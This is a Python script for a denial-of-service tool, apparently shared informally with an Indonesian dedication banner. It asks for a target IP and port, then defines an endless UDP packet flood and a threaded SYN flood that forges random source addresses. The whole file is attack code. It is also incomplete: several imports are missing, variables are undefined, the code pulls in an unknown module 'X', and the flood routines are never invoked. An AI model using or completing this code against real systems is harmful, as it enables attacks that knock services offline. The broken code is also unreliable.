from X import start_url
import threading

print("HANYA UNTUK UPTOBOY")
ip = str(input("IP: "))
port = str(input("PORT:"))

def udpflood():
    global req_code, error
    tar = (str(host_ip),int(port))
    bytes = random._urandom(1180) #1475
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
        except:
            try:
                s.close()
                error += 1
            except:
                pass

class synflood(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)
        
            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = host_url
        
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            try:
                send(IP_Packet/TCP_Packet, verbose=0)
                req_code += 1
            except:
                try:
                    error += 1
                except:
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()

if __name__ == '__main__':
    start_url()
